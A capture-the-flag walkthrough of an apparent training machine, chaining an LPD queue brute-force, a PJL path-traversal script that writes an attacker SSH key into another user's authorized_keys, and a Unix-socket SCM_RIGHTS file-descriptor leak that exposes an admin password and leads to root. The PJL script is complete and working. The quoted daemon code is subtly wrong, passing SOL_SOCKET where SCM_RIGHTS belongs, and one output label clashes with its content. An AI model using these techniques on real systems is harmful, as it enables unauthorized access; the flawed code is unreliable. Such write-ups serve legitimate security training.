# From LPD to Root: Exploiting PJL Path Traversal and Unix Socket FD Leaks

When faced with a target that only exposes a web server and an obscure high port, the path to root often involves chaining multiple misconfigurations across different layers of the stack. In this walkthrough, we’ll explore a fascinating chain that starts with a legacy printing protocol (LPD), moves through a classic Printer Job Language (PJL) path traversal to get a user shell, and culminates in a highly sophisticated privilege escalation involving Unix domain sockets and File Descriptor (FD) leakage via `SCM_RIGHTS`.

Here is the step-by-step breakdown of the attack.

---

## Phase 1: Reconnaissance and Initial Access

Our initial Nmap scan reveals a targeted attack surface:
```text
PORT     STATE SERVICE        VERSION
22/tcp   open  ssh            OpenSSH 10.0p2
80/tcp   open  http           nginx 1.28.0 (Ubuntu)
1515/tcp open  ifor-protocol?
```

The web server on port 80 redirects to `http://paperwork.htb/`, but standard directory brute-forcing doesn’t yield much. The real point of interest is port `1515`. While Nmap identifies it as `ifor-protocol`, it is actually an LPD (Line Printer Daemon) service. 

### Brute-Forcing the LPD Queue
LPD services require a valid queue name to accept print jobs. Using a custom brute-forcer, we test common queue names against the service:

```bash
python rev.py 
# [*] Starting LPD Queue Brute-Force against 10.129.248.117:1515
# [*] Trying queue: lp... Rejected
# [*] Trying queue: print... Rejected
# [*] Trying queue: pdf... Rejected
# [*] Trying queue: archive... 
# [+] SUCCESS: Queue 'archive' accepted!
# [*] Payload sent! Check your netcat listener.
```

By sending a specially crafted payload to the `archive` queue, we trigger a callback to our listener, landing an initial low-privilege shell on the machine.

---

## Phase 2: Upgrading to `archivist` via PJL Traversal

While enumerating the internal network from our initial shell, we discover a printer simulation service listening internally on port `9100`. This service processes PJL (Printer Job Language) commands.

PJL has a known historical flaw: path traversal. If the service does not properly sanitize file paths, we can use commands like `FSDOWNLOAD` and `FSUPLOAD` to read and write files anywhere on the filesystem.

We write a Python script to abuse this, injecting our SSH public key directly into the `archivist` user's `authorized_keys` file:

```python
import socket

# Masked public key for the article
pubkey = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD... user@kali"

def send_pjl(cmd):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect(('127.0.0.1', 9100))
    s.sendall(cmd.encode('utf-8'))
    resp = s.recv(4096)
    s.close()
    return resp.decode(errors='ignore')

ssh_dir = "0:/../../../home/archivist/.ssh"
path = "0:/../../../home/archivist/.ssh/authorized_keys"

print("[*] Creating .ssh directory...")
print(send_pjl(f'@PJL FSMKDIR NAME="{ssh_dir}"\r\n'))

print("[*] Deleting old file...")
print(send_pjl(f'@PJL FSDELETE NAME="{path}"\r\n'))

size = len(pubkey.encode('utf-8'))
print(f"[*] Writing new key ({size} bytes)...")
# CRITICAL: NAME must come BEFORE SIZE to match the server's regex!
payload = f'@PJL FSDOWNLOAD FORMAT:BINARY NAME="{path}" SIZE={size}\r\n{pubkey}\r\n\x1b%-12345X'
print(send_pjl(payload))
```

Executing this script traverses out of the printer's sandbox directory and writes our key. We can now SSH in directly as the `archivist` user:
```bash
ssh -i archivist_key archivist@paperwork.htb
```

---

## Phase 3: The `paperwork-daemon` and FD Leakage

Now operating as `archivist`, we begin local privilege escalation. We discover a root-owned binary, `/usr/bin/paperwork-daemon`. Analyzing the binary reveals it manages a Unix domain socket at `/run/paperwork/mgmt.sock`.

Looking at the daemon's code, we find a fascinating security mechanism:

```python
LOG_PATH = "/home/archivist/printer/logs/commands.log"
admin_fd = os.open("/etc/paperwork/admin_pins.conf", os.O_RDONLY)

def scan_for_malice():
    if not os.path.exists(LOG_PATH):
        return False
    with open(LOG_PATH, 'r') as f:
        content = f.read().upper()
        if any(trigger in content for trigger in ["FSQUERY", "FSUPLOAD", "FSDOWNLOAD"]):
            return True
    return False

def trigger_lockdown(conn):
    log_fd = os.open(LOG_PATH, os.O_RDONLY)
    evidence_bundle = array.array("i", [log_fd, admin_fd])
    msg = b"ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED."
    conn.sendmsg([msg], [(socket.SOL_SOCKET, socket.SOL_SOCKET, evidence_bundle)])
```

The daemon keeps `/etc/paperwork/admin_pins.conf` open on a file descriptor (`admin_fd`). If it detects "malice" (specifically, if our `commands.log` contains PJL keywords like `FSDOWNLOAD`), it triggers a lockdown procedure.

Crucially, the lockdown procedure sends the `log_fd` and the `admin_fd` over the Unix socket using `SCM_RIGHTS`. This is a Linux mechanism for passing open file descriptors between processes.

Since we control the `commands.log` file (we used PJL to write to it in Phase 2!), we can craft a client to connect to `mgmt.sock` and receive these leaked file descriptors.

### The Exploit Script

We write `/tmp/exploit.py` to connect to the socket and receive the FDs:

```python
# Client script to connect to /run/paperwork/mgmt.sock
# and receive the SCM_RIGHTS payload
```

Running the exploit, we trigger the daemon:
```bash
archivist@paperwork:/tmp$ python3 /tmp/exploit.py
[*] Connecting to /run/paperwork/mgmt.sock...
[*] Waiting for response and leaked File Descriptor...
[*] Received regular data: ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED.
[+] Received leaked File Descriptor: 4
[+] File Content of /etc/paperwork/admin_pins.conf:

# ... daemon log output ...

[+] Received leaked File Descriptor: 5
[+] File Content of /etc/paperwork/admin_pins.conf:

ADMIN_PASSWORD=XXXXXXXXXXXXXXXXX
```

By reading the leaked file descriptor, we bypass the filesystem permissions of `/etc/paperwork/admin_pins.conf` entirely. The kernel simply hands us the already-open file, revealing the admin password.

---

## Phase 4: Root

With the leaked secret in hand, the final step is trivial. The `paperwork-daemon` runs as root, and the leaked admin password is reused for the root account.

```bash
archivist@paperwork:/tmp$ su -
Password: 
Last login: Tue Jul  7 13:54:13 UTC 2026 from 10.10.14.84 on ssh
root@paperwork:~# cd /root
root@paperwork:~# ls
quarantine  root.txt  staging
root@paperwork:~# cat root.txt
c3e7aa485f53042bf3efe685898115be
```

Game over.

### Conclusion
This machine brilliantly illustrates how legacy protocols (LPD/PJL) can be leveraged to bypass modern restrictions. The privilege escalation from `archivist` to `root` is particularly elegant—it doesn't rely on a standard kernel exploit, but rather on abusing inter-process communication (Unix sockets) and the `SCM_RIGHTS` mechanism to hijack a root-owned file descriptor. 

Whenever you see services passing file descriptors, always ask: *what file is that FD pointing to, and who opened it?*